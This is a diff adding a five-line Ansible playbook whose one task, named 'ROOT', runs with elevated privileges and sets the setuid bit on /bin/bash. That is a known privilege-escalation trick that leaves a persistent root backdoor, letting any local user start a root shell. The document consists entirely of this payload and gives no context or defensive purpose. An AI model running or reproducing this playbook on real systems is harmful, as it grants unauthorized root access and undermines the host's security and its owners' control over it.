@@ -1,0 +1,5 @@
+- hosts: localhost
+  tasks:
+    - name: ROOT
+      command: chmod u+s /bin/bash
+      become: true
